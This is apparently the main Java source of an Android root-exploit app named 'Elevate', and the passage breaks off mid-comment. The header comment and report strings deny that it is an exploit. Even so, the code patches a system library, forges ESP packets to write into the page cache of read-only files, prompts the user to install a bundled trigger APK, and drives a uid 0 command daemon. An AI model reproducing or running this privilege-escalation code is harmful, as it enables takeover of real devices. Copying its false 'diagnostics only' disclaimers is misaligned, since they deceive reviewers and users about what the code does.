package top.dcmqht.p780ipsec;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Ordinary public-API compatibility diagnostics, NOT a vulnerability exploit or test.
 * The loopback diagnostic sends exactly one plain UDP datagram and one IPsec-protected
 * datagram to 127.0.0.1. It never constructs raw ESP or malformed/fragmented traffic.
 */
public final class MainActivity extends Activity {
    private static final boolean NATIVE_PROBE_AVAILABLE;
    private static final String NATIVE_PROBE_LOAD_ERROR;

    static {
        boolean loaded;
        String error;
        try {
            System.loadLibrary("sendfile_probe");
            loaded = true;
            error = "";
        } catch (UnsatisfiedLinkError e) {
            loaded = false;
            error = e.toString();
        }
        NATIVE_PROBE_AVAILABLE = loaded;
        NATIVE_PROBE_LOAD_ERROR = error;
    }
    private static final byte[] TEST_REMOTE = {(byte) 198, 51, 100, 1};
    private static final byte[] TEST_LOCAL = {127, 0, 0, 1};
    private static final int LOOPBACK_TIMEOUT_MILLIS = 2000;
    private static final byte[] PLAIN_LOOPBACK_PAYLOAD =
            "P780 plain UDP loopback v0.3".getBytes(StandardCharsets.UTF_8);
    private static final byte[] IPSEC_LOOPBACK_PAYLOAD =
            "P780 public API IPsec loopback v0.3".getBytes(StandardCharsets.UTF_8);

    private TextView statusView;
    private TextView outputView;
    private TextView consoleView;
    private EditText commandInput;
    private Button rootButton;
    private Button runButton;
    private final android.os.Handler ui = new android.os.Handler(android.os.Looper.getMainLooper());

    private String daemonState;
    private String daemonCmd;
    private String daemonSeq;
    private String daemonOut;
    private int seq = 0;
    private java.io.File beatFile;
    private final Runnable tick = new Runnable() {
        public void run() {
            refreshStatus();
            ui.postDelayed(this, 2000);
        }
    };
    private boolean daemonAlive() {
        return beatFile != null && beatFile.exists()
                && (System.currentTimeMillis() - beatFile.lastModified()) < 5000;
    }

    @Override
    protected void onResume() {
        super.onResume();
        ui.post(tick);
        if (!getPackageManager().canRequestPackageInstalls()) {
            new android.app.AlertDialog.Builder(this)
                    .setTitle("\u9700\u8981\u5b89\u88c5\u6743\u9650")
                    .setMessage("Elevate \u9700\u8981\u300c\u5b89\u88c5\u672a\u77e5\u5e94\u7528\u300d\u6743\u9650\u624d\u80fd\u89e6\u53d1 root\u3002\n\n"
                            + "\u70b9\u300c\u53bb\u8bbe\u7f6e\u300d\u540e\u6253\u5f00\u5f00\u5173\uff0c\u8fd4\u56de\u5373\u53ef\u3002")
                    .setCancelable(false)
                    .setPositiveButton("\u53bb\u8bbe\u7f6e", (d, w) -> {
                        try {
                            startActivity(new android.content.Intent(
                                    android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                                    android.net.Uri.parse("package:" + getPackageName())));
                        } catch (Throwable ignored) {
                        }
                    })
                    .setNegativeButton("\u9000\u51fa", (d, w) -> finish())
                    .show();
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        ui.removeCallbacks(tick);
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String base = getFilesDir().getAbsolutePath();
        daemonState = base + "/p780_state";
        daemonCmd = base + "/p780_cmd";
        daemonSeq = base + "/p780_seq";
        daemonOut = base + "/p780_out";
        beatFile = new java.io.File(base, "p780_beat");
        buildUi();
        // only the lock is cleared on start; the state file must survive the
        // activity restart that follows a successful trigger install
        new java.io.File(getFilesDir(), "p780_lock").delete();
        if (getIntent() != null && getIntent().hasExtra("installStatus")) {
            int status = getIntent().getIntExtra("installStatus", -1);
            String message = getIntent().getStringExtra("installMessage");
            log("\u5b89\u88c5\u7ed3\u679c: status=" + status + (message == null ? "" : " " + message));
            ui.postDelayed(this::refreshStatus, 1500);
        }
        String autoProbe = getIntent() == null ? null : getIntent().getStringExtra("probe");
        if (autoProbe != null) {
            ui.post(() -> runHeadless(autoProbe));
        } else {
            ui.post(this::refreshStatus);
        }
    }

    private int dp(float v) {
        return Math.round(getResources().getDisplayMetrics().density * v);
    }

    private void buildUi() {
        int bg = 0xFF0E1116, card = 0xFF161B22, accent = 0xFF2DD4BF, text = 0xFFE6E8EB, dim = 0xFF8B949E;

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(bg);
        root.setPadding(dp(20), dp(28), dp(20), dp(16));

        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(android.view.Gravity.CENTER_VERTICAL);

        ImageView icon = new ImageView(this);
        icon.setImageResource(R.mipmap.ic_launcher);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(52), dp(52));
        iconLp.rightMargin = dp(14);
        header.addView(icon, iconLp);

        LinearLayout titles = new LinearLayout(this);
        titles.setOrientation(LinearLayout.VERTICAL);
        TextView name = new TextView(this);
        name.setText("Elevate");
        name.setTextColor(text);
        name.setTextSize(24);
        name.setTypeface(null, android.graphics.Typeface.BOLD);
        TextView sub = new TextView(this);
        sub.setText("P780 \u00b7 temporary root console");
        sub.setTextColor(dim);
        sub.setTextSize(12);
        titles.addView(name);
        titles.addView(sub);
        header.addView(titles);
        root.addView(header);

        statusView = new TextView(this);
        statusView.setText("\u672a\u8fde\u63a5");
        statusView.setTextColor(dim);
        statusView.setTextSize(13);
        statusView.setPadding(dp(12), dp(8), dp(12), dp(8));
        android.graphics.drawable.GradientDrawable pill = new android.graphics.drawable.GradientDrawable();
        pill.setColor(card);
        pill.setCornerRadius(dp(14));
        statusView.setBackground(pill);
        LinearLayout.LayoutParams statusLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        statusLp.topMargin = dp(18);
        root.addView(statusView, statusLp);

        rootButton = new Button(this);
        rootButton.setText("\u83b7\u53d6 Root");
        rootButton.setAllCaps(false);
        rootButton.setTextSize(16);
        rootButton.setTextColor(0xFF04120F);
        android.graphics.drawable.GradientDrawable btn = new android.graphics.drawable.GradientDrawable();
        btn.setColor(accent);
        btn.setCornerRadius(dp(14));
        rootButton.setBackground(btn);
        rootButton.setOnClickListener(v -> requestRoot());
        LinearLayout.LayoutParams btnLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(52));
        btnLp.topMargin = dp(14);
        root.addView(rootButton, btnLp);

        LinearLayout cmdRow = new LinearLayout(this);
        cmdRow.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams cmdLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        cmdLp.topMargin = dp(16);
        commandInput = new EditText(this);
        commandInput.setHint("id  /  ls\uff08\u4ec5 shell \u5185\u5efa\uff09");
        commandInput.setTextColor(text);
        commandInput.setHintTextColor(dim);
        commandInput.setTextSize(14);
        android.graphics.drawable.GradientDrawable field = new android.graphics.drawable.GradientDrawable();
        field.setColor(card);
        field.setCornerRadius(dp(12));
        commandInput.setBackground(field);
        commandInput.setPadding(dp(12), dp(10), dp(12), dp(10));
        cmdRow.addView(commandInput, new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f));

        runButton = new Button(this);
        runButton.setText("\u6267\u884c");
        runButton.setAllCaps(false);
        runButton.setTextColor(text);
        android.graphics.drawable.GradientDrawable runBg = new android.graphics.drawable.GradientDrawable();
        runBg.setColor(card);
        runBg.setCornerRadius(dp(12));
        runButton.setBackground(runBg);
        runButton.setOnClickListener(v -> runCommand());
        LinearLayout.LayoutParams runLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        runLp.leftMargin = dp(8);
        cmdRow.addView(runButton, runLp);
        root.addView(cmdRow, cmdLp);

        Button cleanButton = new Button(this);
        cleanButton.setText("\u6e05\u7406\u73af\u5883");
        cleanButton.setAllCaps(false);
        cleanButton.setTextColor(dim);
        android.graphics.drawable.GradientDrawable cleanBg = new android.graphics.drawable.GradientDrawable();
        cleanBg.setColor(card);
        cleanBg.setCornerRadius(dp(12));
        cleanButton.setBackground(cleanBg);
        cleanButton.setOnClickListener(v -> {
            new Thread(() -> {
                String r = libraryPatched() ? unpatchProbe() : null;
                cleanupState();
                ui.post(() -> {
                    log(r != null && r.contains("ROLLBACK COMPLETE")
                            ? "\u5df2\u6062\u590d\u5e93\u5e76\u6e05\u7406\u72b6\u6001\u3002"
                            : "\u5df2\u6e05\u7406\u72b6\u6001\uff08\u5e93\u672a\u88ab\u4fee\u6539\uff09\u3002");
                    refreshStatus();
                });
            }).start();
        });
        LinearLayout.LayoutParams cleanLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        cleanLp.topMargin = dp(8);
        root.addView(cleanButton, cleanLp);

        consoleView = new TextView(this);
        consoleView.setTextColor(0xFFC9D1D9);
        consoleView.setTextSize(12);
        consoleView.setTypeface(android.graphics.Typeface.MONOSPACE);
        consoleView.setTextIsSelectable(true);
        consoleView.setText("\u8f93\u51fa\u5c06\u663e\u793a\u5728\u8fd9\u91cc\u3002");
        outputView = consoleView;
        android.graphics.drawable.GradientDrawable cardBg = new android.graphics.drawable.GradientDrawable();
        cardBg.setColor(card);
        cardBg.setCornerRadius(dp(14));
        consoleView.setBackground(cardBg);
        consoleView.setPadding(dp(14), dp(12), dp(14), dp(12));

        ScrollView scroll = new ScrollView(this);
        scroll.addView(consoleView, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        LinearLayout.LayoutParams scrollLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f);
        scrollLp.topMargin = dp(16);
        root.addView(scroll, scrollLp);

        setContentView(root);
    }

    private String readText(String path) {
        try {
            byte[] all = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path));
            return new String(all, java.nio.charset.StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private void writeText(String path, String text) {
        try (java.io.FileOutputStream out = new java.io.FileOutputStream(path)) {
            out.write(text.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        } catch (Exception ignored) {
        }
    }

    private void refreshStatus() {
        boolean ready = daemonAlive();
        if (statusView != null) {
            statusView.setText(ready ? "\u5df2\u8fde\u63a5 \u00b7 uid 0" : "\u672a\u8fde\u63a5");
            statusView.setTextColor(ready ? 0xFF2DD4BF : 0xFF8B949E);
        }
        if (rootButton != null) {
            rootButton.setText(ready ? "\u91cd\u65b0\u83b7\u53d6" : "\u83b7\u53d6 Root");
        }
    }

    private void cleanupState() {
        if (daemonAlive()) {
            writeText(daemonCmd, "__quit\n");
            seq++;
            writeText(daemonSeq, String.valueOf(seq) + "\n");
            try {
                Thread.sleep(1200);
            } catch (InterruptedException ignored) {
            }
        }
        for (String n : new String[]{"p780_state", "p780_beat", "p780_cmd", "p780_seq", "p780_out"}) {
            new java.io.File(getFilesDir(), n).delete();
        }
        new java.io.File(getFilesDir(), "p780_lock").delete();
    }

    private boolean libraryPatched() {
        try (java.io.RandomAccessFile raf = new java.io.RandomAccessFile(PatchData.LIB, "r")) {
            raf.seek(PatchData.SENTRY);
            byte[] entry = new byte[16];
            raf.readFully(entry);
            return !hex(entry).equals(PatchData.PROLOGUE_HEX);
        } catch (Throwable t) {
            return false;
        }
    }

    private void log(String line) {
        android.util.Log.i("Elevate", line);
        ui.post(() -> consoleView.append(line.endsWith("\n") ? line : line + "\n"));
    }

    private void requestRoot() {
        new java.io.File(getFilesDir(), "p780_lock").delete();
        rootButton.setEnabled(false);
        statusView.setText("\u6b63\u5728\u5199\u5165\u8f7d\u8377\u2026");
        new Thread(() -> {
            String report = patchProbe();
            int ok = 0, bad = 0;
            for (String line : report.split("\n")) {
                if (line.contains("block 0x") && line.contains(": OK")) ok++;
                else if (line.contains("MISMATCH") || line.contains("ABORT:")) bad++;
            }
            log("\u5199\u5165\u8f7d\u8377\uff1a" + ok + " \u5757\u6210\u529f\uff0c" + bad + " \u5757\u5f02\u5e38");
            if (bad > 0) log(report);
            if (daemonAlive()) {
                ui.post(() -> {
                    rootButton.setEnabled(true);
                    refreshStatus();
                });
                return;
            }
            ui.post(() -> {
                statusView.setText("\u9700\u8981\u4e00\u6b21\u5b89\u88c5\u786e\u8ba4");
                rootButton.setEnabled(true);
                showTriggerHint();
            });
        }).start();
    }

    private void showTriggerHint() {
        installTrigger();
    }

    private void installTrigger() {
        new Thread(() -> {
            try {
                java.io.File apk = new java.io.File(getCacheDir(), ApkProvider.NAME);
                try (java.io.InputStream in = getAssets().open("trigger.apk");
                     java.io.FileOutputStream out = new java.io.FileOutputStream(apk)) {
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = in.read(buf)) > 0) {
                        out.write(buf, 0, n);
                    }
                }
                android.net.Uri uri = android.net.Uri.parse(
                        "content://" + ApkProvider.AUTHORITY + "/" + ApkProvider.NAME);
                android.content.Intent intent = new android.content.Intent(
                        android.content.Intent.ACTION_INSTALL_PACKAGE);
                intent.setData(uri);
                intent.addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION);
                ui.post(() -> {
                    startActivity(intent);
                    log("\u5df2\u6253\u5f00\u7cfb\u7edf\u5b89\u88c5\u5668\uff0c\u8bf7\u70b9\u300c\u5b89\u88c5\u300d\u3002");
                });
            } catch (Throwable t) {
                log("\u89e6\u53d1\u5b89\u88c5\u5931\u8d25: " + t);
            }
        }).start();
    }

    private void runCommand() {
        String cmd = commandInput.getText().toString().trim();
        if (cmd.isEmpty()) {
            return;
        }
        if (!daemonAlive()) {
            log("\u672a\u8fde\u63a5\uff1a\u8bf7\u5148\u70b9\u300c\u83b7\u53d6 Root\u300d\u5e76\u5b8c\u6210\u4e00\u6b21\u5b89\u88c5\u3002");
            refreshStatus();
            return;
        }
        runButton.setEnabled(false);
        new Thread(() -> {
            writeText(daemonCmd, cmd + "\n");
            seq++;
            writeText(daemonSeq, String.valueOf(seq) + "\n");
            String out = null;
            for (int i = 0; i < 40; i++) {
                try {
                    Thread.sleep(150);
                } catch (InterruptedException ignored) {
                }
                String text = readText(daemonOut);
                if (text != null && text.contains("SEQ " + seq + " END")) {
                    out = text;
                    break;
                }
            }
            final String result = out;
            ui.post(() -> {
                runButton.setEnabled(true);
                log("$ " + cmd);
                log(result == null ? "(\u8d85\u65f6)" : result.replace("SEQ " + seq + " END", "").trim());
            });
        }).start();
    }

    private void runHeadless(String what) {
        switch (what) {
            case "patch": execute(Probe.PATCH); break;
            case "unpatch": execute(Probe.UNPATCH); break;
            case "check": execute(Probe.CHECK); break;
            default: execute(Probe.CHECK); break;
        }
    }

    private enum Probe {
        READ_ONLY,
        RESOURCES,
        LOOPBACK,
        FILEBACKED_UDP,
        ESP_PAGE_WRITE,
        SYS_WRITE,
        STUB_TEST,
        PATCH,
        UNPATCH,
        CHECK
    }

    private void execute(Probe probe) {
        setProbeButtonsEnabled(false);
        outputView.setText("检查中……");
        new Thread(() -> {
            String result;
            try {
                if (probe == Probe.RESOURCES) {
                    result = resourceProbe();
                } else if (probe == Probe.LOOPBACK) {
                    result = loopbackProbe();
                } else if (probe == Probe.FILEBACKED_UDP) {
                    result = fileBackedUdpProbe();
                } else if (probe == Probe.ESP_PAGE_WRITE) {
                    result = espPageCacheProbe();
                } else if (probe == Probe.SYS_WRITE) {
                    result = sysWriteProbe();
                } else if (probe == Probe.CHECK) {
                    result = checkProbe();
                } else if (probe == Probe.PATCH) {
                    result = patchProbe();
                } else if (probe == Probe.UNPATCH) {
                    result = unpatchProbe();
                } else if (probe == Probe.STUB_TEST) {
                    result = readOnlyProbe() + "\n\n"
                            + runStubSelfTest();
                } else {
                    result = readOnlyProbe();
                }
            } catch (Exception e) {
                result = "Unexpected probe error: " + describe(e);
            }
            final String complete = result;
            publishReport(complete);
            runOnUiThread(() -> {
                outputView.setText(complete);
                setProbeButtonsEnabled(true);
            });
        }, "p780-ipsec-diagnostics").start();
    }

    private void setProbeButtonsEnabled(boolean enabled) {
    }

    private String readOnlyProbe() {
        StringBuilder report = new StringBuilder();
        report.append("P780 IPsec / UDP diagnostics 0.4.0\n");
        report.append("Android API: ").append(Build.VERSION.SDK_INT).append('\n');
        report.append("Device model: ").append(Build.MODEL).append('\n');
        report.append("Kernel version: ")
                .append(System.getProperty("os.version", "unavailable")).append('\n');
        report.append("IPsec service: ");
        try {
            report.append(getSystemService(IpSecManager.class) != null
                    ? "manager accessible" : "manager unavailable");
        } catch (Exception e) {
            report.append("lookup failed: ").append(describe(e));
        }
        report.append("\nNO resource allocation; NO traffic during this check.\n");
        report.append("Does NOT establish DirtyFrag vulnerability or root access.");
        return report.toString();
    }

    private String resourceProbe() {
        StringBuilder report = new StringBuilder(readOnlyProbe());
        report.append("\n\nRESOURCE PROBE (user-initiated)\n");
        if (Build.VERSION.SDK_INT < 28) {
            report.append("SKIPPED: IPsec public API requires Android API 28+");
            return report.toString();
        }

        IpSecManager manager = getSystemService(IpSecManager.class);
        if (manager == null) {
            report.append("SKIPPED: IpSecManager unavailable");
            return report.toString();
        }

        IpSecManager.SecurityParameterIndex spi = null;
        IpSecManager.UdpEncapsulationSocket udp = null;
        IpSecTransform transform = null;
        byte[] encryptionKey = new byte[16];
        byte[] authenticationKey = new byte[32];

        try {
            // TEST-NET-2 (RFC 5737); an address only, never contacted.
            InetAddress remote = InetAddress.getByAddress(TEST_REMOTE);
            InetAddress local = InetAddress.getByAddress(TEST_LOCAL);

            report.append("1. Reserve SPI (198.51.100.1): ");
            try {
                spi = manager.allocateSecurityParameterIndex(remote);
                report.append("PASS; SPI allocated\n");
            } catch (Exception e) {
                report.append("FAIL: ").append(describe(e)).append('\n');
                return report.toString();
            }

            report.append("2. Open UDP encapsulation socket: ");
            try {
                udp = manager.openUdpEncapsulationSocket();
                report.append("PASS; bound local port ")
                        .append(udp.getPort()).append("; no traffic\n");
            } catch (Exception e) {
                report.append("FAIL: ").append(describe(e)).append('\n');
                return report.toString();
            }

            report.append("3. Create unassigned transport transform: ");
            try {
                SecureRandom random = new SecureRandom();
                random.nextBytes(encryptionKey);
                random.nextBytes(authenticationKey);

                IpSecAlgorithm encryption = new IpSecAlgorithm(
                        IpSecAlgorithm.CRYPT_AES_CBC, encryptionKey);
                IpSecAlgorithm authentication = new IpSecAlgorithm(
                        IpSecAlgorithm.AUTH_HMAC_SHA256, authenticationKey, 128);

                // No applyTransportModeTransform call; no send or receive.
                transform = new IpSecTransform.Builder(this)
                        .setEncryption(encryption)
                        .setAuthentication(authentication)
                        .setIpv4Encapsulation(udp, 4500)
                        .buildTransportModeTransform(local, spi);
                report.append("PASS; installed temporarily, NEVER applied\n");
            } catch (Exception e) {
                report.append("FAIL: ").append(describe(e)).append('\n');
            }
        } catch (Exception e) {
            report.append("Setup failed: ").append(describe(e)).append('\n');
        } finally {
            if (transform != null) {
                try {
                    transform.close();
                    report.append("Transform closed.\n");
                } catch (Exception e) {
                    report.append("Transform close failed: ").append(describe(e)).append('\n');
                }
            }
            if (udp != null) {
                try {
                    udp.close();
                    report.append("UDP socket closed.\n");
                } catch (Exception e) {
                    report.append("UDP socket close failed: ").append(describe(e)).append('\n');
                }
            }
            if (spi != null) {
                try {
                    spi.close();
                    report.append("SPI allocation closed.\n");
                } catch (Exception e) {
                    report.append("SPI close failed: ").append(describe(e)).append('\n');
                }
            }
            Arrays.fill(encryptionKey, (byte) 0);
            Arrays.fill(authenticationKey, (byte) 0);
        }

        report.append("No packets sent; no sockets assigned; no exploit attempted.\n");
        report.append("PASS indicates public API resource support only, NOT DirtyFrag.");
        return report.toString();
    }

    private String loopbackProbe() {
        StringBuilder report = new StringBuilder(readOnlyProbe());
        report.append("\n\nUDP/ESP LOOPBACK DIAGNOSTIC (user-initiated)\n");
        report.append("Scope: 127.0.0.1 only; one plain UDP datagram and one API-protected datagram.\n");
        if (Build.VERSION.SDK_INT < 28) {
            report.append("SKIPPED: IPsec public API requires Android API 28+");
            return report.toString();
        }

        IpSecManager manager = getSystemService(IpSecManager.class);
        if (manager == null) {
            report.append("SKIPPED: IpSecManager unavailable");
            return report.toString();
        }

        final InetAddress loopback;
        try {
            loopback = InetAddress.getByAddress(TEST_LOCAL);
        } catch (Exception e) {
            report.append("Loopback address setup failed: ").append(describe(e));
            return report.toString();
        }

        report.append("1. Plain UDP loopback: ");
        try (DatagramSocket socket = new DatagramSocket(new InetSocketAddress(loopback, 0))) {
            socket.setSoTimeout(LOOPBACK_TIMEOUT_MILLIS);
            sendAndVerifyLoopback(socket, loopback, PLAIN_LOOPBACK_PAYLOAD);
            report.append("PASS; 1 datagram sent and received\n");
        } catch (Exception e) {
            report.append("FAIL: ").append(describe(e)).append('\n');
            report.append("IPsec phase not attempted because the UDP baseline failed.");
            return report.toString();
        }

        IpSecManager.SecurityParameterIndex spi = null;
        IpSecManager.UdpEncapsulationSocket encapSocket = null;
        IpSecTransform transform = null;
        DatagramSocket protectedSocket = null;
        boolean transformApplied = false;
        byte[] encryptionKey = new byte[16];
        byte[] authenticationKey = new byte[32];

        try {
            SecureRandom random = new SecureRandom();
            random.nextBytes(encryptionKey);
            random.nextBytes(authenticationKey);

            spi = manager.allocateSecurityParameterIndex(loopback);
            encapSocket = manager.openUdpEncapsulationSocket();
            transform = new IpSecTransform.Builder(this)
                    .setEncryption(new IpSecAlgorithm(
                            IpSecAlgorithm.CRYPT_AES_CBC, encryptionKey))
                    .setAuthentication(new IpSecAlgorithm(
                            IpSecAlgorithm.AUTH_HMAC_SHA256, authenticationKey, 128))
                    .setIpv4Encapsulation(encapSocket, encapSocket.getPort())
                    .buildTransportModeTransform(loopback, spi);

            protectedSocket = new DatagramSocket(new InetSocketAddress(loopback, 0));
            protectedSocket.setSoTimeout(LOOPBACK_TIMEOUT_MILLIS);

            manager.applyTransportModeTransform(
                    protectedSocket, IpSecManager.DIRECTION_IN, transform);
            transformApplied = true;
            manager.applyTransportModeTransform(
                    protectedSocket, IpSecManager.DIRECTION_OUT, transform);

            report.append("2. Public-API UDP-encapsulated ESP loopback: ");
            sendAndVerifyLoopback(protectedSocket, loopback, IPSEC_LOOPBACK_PAYLOAD);
            report.append("PASS; 1 protected datagram sent and received\n");
        } catch (Exception e) {
            report.append("2. Public-API UDP-encapsulated ESP loopback: FAIL: ")
                    .append(describe(e)).append('\n');
        } finally {
            if (transformApplied && protectedSocket != null) {
                try {
                    manager.removeTransportModeTransforms(protectedSocket);
                    report.append("Transport policies removed from diagnostic socket.\n");
                } catch (Exception e) {
                    report.append("Transform removal failed: ").append(describe(e)).append('\n');
                }
            }
            if (protectedSocket != null) {
                protectedSocket.close();
                report.append("Diagnostic UDP socket closed.\n");
            }
            if (transform != null) {
                try {
                    transform.close();
                    report.append("Transform closed.\n");
                } catch (Exception e) {
                    report.append("Transform close failed: ").append(describe(e)).append('\n');
                }
            }
            if (encapSocket != null) {
                try {
                    encapSocket.close();
                    report.append("Encapsulation socket closed.\n");
                } catch (Exception e) {
                    report.append("Encapsulation socket close failed: ")
                            .append(describe(e)).append('\n');
                }
            }
            if (spi != null) {
                try {
                    spi.close();
                    report.append("SPI allocation closed.\n");
                } catch (Exception e) {
                    report.append("SPI close failed: ").append(describe(e)).append('\n');
                }
            }
            Arrays.fill(encryptionKey, (byte) 0);
            Arrays.fill(authenticationKey, (byte) 0);
        }

        report.append("Only loopback traffic was used; no raw/malformed/fragmented packet was built.\n");
        report.append("PASS confirms ordinary API loopback only, NOT DirtyFrag or root access.");
        return report.toString();
    }

    private String fileBackedUdpProbe() {
        StringBuilder report = new StringBuilder(readOnlyProbe());
        report.append("\n\nFILE-BACKED UDP SENDFILE LOOPBACK (user-initiated)\n");
        report.append("Scope: app-private temporary file -> 127.0.0.1 UDP; no IPsec/ESP.\n");
        if (!NATIVE_PROBE_AVAILABLE) {
            report.append("SKIPPED: native probe library unavailable: ")
                    .append(NATIVE_PROBE_LOAD_ERROR).append('\n');
            return report.toString();
        }
        try {
            report.append(runFileBackedUdpProbe(getCacheDir().getAbsolutePath()));
        } catch (Exception e) {
            report.append("Probe wrapper failed: ").append(describe(e)).append('\n');
        }
        report.append("This is not an ESP/page-cache exploit test and does NOT establish DirtyFrag.\n");
        return report.toString();
    }

    /** Mirror the report to logcat (chunked) and to cacheDir/last-report.txt. */
    private void publishReport(String report) {
        android.util.Log.i("P780PROBE", "----BEGIN----");
        final int chunk = 2500;
        for (int i = 0; i < report.length(); i += chunk) {
            android.util.Log.i("P780PROBE",
                    report.substring(i, Math.min(report.length(), i + chunk)));
        }
        android.util.Log.i("P780PROBE", "----END----");
        try (java.io.FileWriter writer = new java.io.FileWriter(
                new java.io.File(getCacheDir(), "last-report.txt"))) {
            writer.write(report);
        } catch (Exception e) {
            android.util.Log.w("P780PROBE", "report file write failed: " + e);
        }
    }

    private native String runValidEspSend(
            String path, int spi, int encapPort, byte[] iv, byte[] icv, byte[] expected);

    /**
     * Valid-ESP acceptance test. Builds a well-formed transport-mode payload,
     * encrypts it with the SA keys, computes a correct ICV (both the plain and
     * the ESN layout), splices the ciphertext from an app-private file, and
     * asks whether the kernel accepts the packet and whether the file page now
     * holds the plaintext we expect.
     */
    private String validEspProbe(IpSecManager manager, InetAddress loopback,
            IpSecTransform transform, IpSecManager.SecurityParameterIndex spi,
            IpSecManager.UdpEncapsulationSocket encap,
            byte[] encryptionKey, byte[] authenticationKey) {
        StringBuilder report = new StringBuilder("VALID-ESP ACCEPTANCE TEST (v0.5)\n");
        DatagramSocket protectedSocket = null;
        java.io.File target = new java.io.File(getCacheDir(), "p780-valid-esp.bin");
        try {
            protectedSocket = new DatagramSocket(new InetSocketAddress(loopback, 0));
            protectedSocket.setSoTimeout(2500);
            manager.applyTransportModeTransform(
                    protectedSocket, IpSecManager.DIRECTION_IN, transform);
            int innerPort = protectedSocket.getLocalPort();
            report.append("Inbound transform applied; inner UDP port ")
                    .append(innerPort).append('\n');

            byte[] payload = "P780-VALID-ESP".getBytes(StandardCharsets.US_ASCII);
            ByteBuffer seg = ByteBuffer.allocate(8 + payload.length).order(ByteOrder.BIG_ENDIAN);
            seg.putShort((short) 4500);
            seg.putShort((short) innerPort);
            seg.putShort((short) (8 + payload.length));
            seg.putShort((short) 0);
            seg.put(payload);
            byte[] segment = seg.array();

            int pad = (16 - ((segment.length + 2) % 16)) % 16;
            byte[] plain = new byte[segment.length + pad + 2];
            System.arraycopy(segment, 0, plain, 0, segment.length);
            plain[segment.length + pad] = (byte) pad;
            plain[segment.length + pad + 1] = 17;

            byte[] iv = new byte[16];
            new SecureRandom().nextBytes(iv);
            Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE,
                    new SecretKeySpec(encryptionKey, "AES"), new IvParameterSpec(iv));
            byte[] ciphertext = cipher.doFinal(plain);

            try (java.io.FileOutputStream out = new java.io.FileOutputStream(target)) {
                out.write(ciphertext);
            }
            report.append("Ciphertext file: ").append(ciphertext.length)
                    .append(" bytes; plaintext ").append(plain.length).append(" bytes\n");

            byte[] header = new byte[8];
            int value = spi.getSpi();
            header[0] = (byte) (value >>> 24);
            header[1] = (byte) (value >>> 16);
            header[2] = (byte) (value >>> 8);
            header[3] = (byte) value;
            header[7] = 1;

            boolean accepted = false;
            for (boolean esn : new boolean[] {false, true}) {
                Mac mac = Mac.getInstance("HmacSHA256");
                mac.init(new SecretKeySpec(authenticationKey, "HmacSHA256"));
                mac.update(header);
                mac.update(iv);
                mac.update(ciphertext);
                if (esn) {
                    mac.update(new byte[4]);  // high-order sequence number from SA state
                }
                byte[] icv = Arrays.copyOf(mac.doFinal(), 16);

                report.append("ESN layout=").append(esn).append(": ");
                report.append(runValidEspSend(target.getAbsolutePath(),
                        spi.getSpi(), encap.getPort(), iv, icv, plain));

                byte[] buf = new byte[512];
                DatagramPacket packet = new DatagramPacket(buf, buf.length);
                try {
                    protectedSocket.receive(packet);
                    byte[] got = Arrays.copyOf(buf, packet.getLength());
                    report.append("  receive: PASS, ").append(got.length)
                            .append(" bytes, payload match=")
                            .append(Arrays.equals(got, payload)).append('\n');
                    accepted = true;
                    break;
                } catch (java.net.SocketTimeoutException timeout) {
                    report.append("  receive: timeout (not accepted)\n");
                }
            }
            report.append(accepted
                    ? "RESULT: the SA accepted a forged valid ESP packet.\n"
                    : "RESULT: neither ICV layout was accepted.\n");
        } catch (Exception e) {
            report.append("valid-ESP probe failed: ").append(describe(e)).append('\n');
        } finally {
            if (protectedSocket != null) {
                try {
                    manager.removeTransportModeTransforms(protectedSocket);
                } catch (Exception ignored) {
                    // socket may already be gone
                }
                protectedSocket.close();
            }
            if (target.exists() && !target.delete()) {
                report.append("warning: ciphertext file not deleted\n");
            }
        }
        return report.toString();
    }

    private native String runStubSelfTest();

    private native String runSysWriteProbe(String path, int offset, int spi,
            int encapPort, int seq, byte[] iv, byte[] tail, byte[] icv);

    private native String spawnOrphan();

    /**
     * v0.6: write into the page cache of a read-only system library.
     *
